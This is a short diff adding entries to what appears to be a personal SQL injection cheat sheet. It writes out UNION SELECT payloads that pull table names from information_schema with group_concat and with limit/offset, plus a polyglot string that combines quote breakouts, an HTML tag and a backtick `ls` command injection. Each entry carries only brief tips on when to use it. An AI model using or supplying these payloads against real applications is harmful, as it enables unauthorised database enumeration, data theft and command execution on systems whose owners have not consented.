@@ -16,4 +16,17 @@
 
 
 # Group concat
-" 
+# good for joining stuff in a subquery
+" union select group_concat(table_name),2,3,4,5 from information_schema.tables;--+
+
+
+
+# limit offset
+# limit 1 is good for subqueries
+# offset is good for finding rows other than first row
+
+" union select 1,2,table_name from information_schema.tables limit 1 offset 50;--+
+
+
+# polyglot
+"'<lol/>`ls`#--+;~//+@@ 
